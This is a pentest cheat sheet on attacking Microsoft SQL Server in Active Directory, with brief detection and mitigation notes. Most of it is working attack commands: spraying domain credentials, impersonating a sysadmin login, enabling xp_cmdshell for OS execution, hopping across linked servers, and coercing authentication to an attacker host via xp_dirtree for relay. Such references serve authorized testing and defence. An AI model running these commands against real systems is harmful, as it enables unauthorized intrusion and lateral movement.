---
title: MSSQL in AD
category: AD / Lateral Movement
order: 30
tags: [mssql, xp_cmdshell, linked-servers, impersonation, coerce, relay]
summary: >
  SQL Server is everywhere on internal networks and speaks Windows auth. Log in
  with domain creds, escalate via impersonation or trustworthy DBs, run OS
  commands with xp_cmdshell, hop across linked servers, or coerce its auth for a
  relay.
prerequisites:
  - Domain creds that can log into a SQL instance ($ip), or a captured SQL login
  - For OS exec: sysadmin (directly, via impersonation, or a trustworthy DB chain)
tools: [netexec (mssql), impacket (mssqlclient), PowerUpSQL, mssqlpwner]
detection:
  - xp_cmdshell enablement/use; unusual EXECUTE AS; linked-server queries; SQL auth from odd hosts
mitigation:
  - Least-privilege SQL logins; disable xp_cmdshell; avoid TRUSTWORTHY; separate service accounts
refs:
  - { label: "PowerUpSQL", url: "https://github.com/NetSPI/PowerUpSQL" }
  - { label: "HackTricks — MSSQL", url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" }
---

## Find + log in

```sh
# spray domain creds against SQL, see where you can log in / are admin
netexec mssql $ip -u $user -p $password
netexec mssql $ip/24 -u $user -p $password --local-auth
mssqlclient.py -windows-auth $domain/$user:$password@$ip
```

## Privilege escalation inside SQL

```sql
-- who am I / can I impersonate?
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT distinct b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';
-- impersonate a sysadmin login
EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
```

## OS command execution

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Linked servers (hop to other instances)

```sql
EXEC sp_linkedservers;                              -- discover
SELECT * FROM OPENQUERY("SQL02", 'SELECT SYSTEM_USER');
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT "SQL02";
```

## Coerce SQL auth → relay

```sql
-- make the SQL service account authenticate to you (then relay it — see NTLM relay)
EXEC master..xp_dirtree '\\$attacker_ip\share', 1, 1;
```

> `mssqlpwner` / PowerUpSQL automate the impersonation + linked-server graph —
> handy for chaining several hops to a sysadmin context.
